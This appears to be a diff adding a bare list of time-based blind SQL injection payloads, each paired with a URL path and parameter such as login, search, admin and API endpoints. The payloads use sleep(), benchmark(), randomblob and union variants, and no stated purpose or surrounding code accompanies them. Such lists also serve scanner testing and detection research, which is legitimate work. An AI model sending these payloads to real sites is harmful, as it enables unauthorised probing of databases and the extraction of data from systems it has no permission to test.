@@ -1,0 +1,27 @@
+/index.php?id=1|' and (select * from (select(sleep(4)))a)
+/api/users?search=test|' and (select * from (select(sleep(4)))a)
+/view.php?type=1| and (select 1 from (select(sleep(3)))x)
+/api/v1/products?search=test|" and (select 2 from (select(sleep(2)))y)
+/api/items?cat=1| and (select 1 from (select(sleep(2)))x)
+/dashboard.php?id=1|' and (select 7544 from (select(sleep(3)))kNzZ) and 'vjXn'='vjXn
+/api/v2/news?id=1|' and (select(sleep(3)))#
+/products.php?id=1|' xor (select(6217) from (select(sleep(2)))a) xor 'b
+/index.php?user=admin|' and 9539=like('ABCDEFG', upper(hex(randomblob(200000000/2))))--
+/admin/login.php?id=1|' and (select 1 from (select(sleep(2)))x)--
+/api/v3/auth?user=1|' or (select(sleep(3)))#
+/index.php?cat=1| and 2254=benchmark(3000000,md5(1))--
+/main.php?id=1|' and (select 1 from (select(sleep(3)))x)
+/api/search?q=test|' union select sleep(3),2,3--
+/view/item.php?id=1| and 2212=benchmark(4000000,sha1(1))--
+/store.php?id=1|'-(select 6345 from (select(sleep(2)))a)-'
+/api/posts?id=1|)+and sleep(2) and (1182=1182
+/index.php?id=1| or 2 between 1 and benchmark(2000000,md5(1))--
+/api/v1/details?id=1|' and (select 1 from (select(sleep(2)))x)--
+/catalog.php?id=1| and (select 1 from (select(sleep(2)))and 5=5
+/api/v4/gate?id=1|' or (select * from (select(sleep(4)))a) union select 1--
+/login.php?user=1|')) or (select(sleep(3)))#
+/search.php?query=1|' and (select 2323 from (select(sleep(2)))a) and '1'='1
+/app/auth?token=1|" or (select 1 from (select(sleep(3)))x) or "1"="1
+/index.php?id=1|' and 2212=benchmark(5000000,sha1(1))--
+/admin/dash?p=1|' and (select(sleep(4))) order by 1--
+/api/v2/items?cat=1|' and (select(sleep(3))) procedure analyse()--
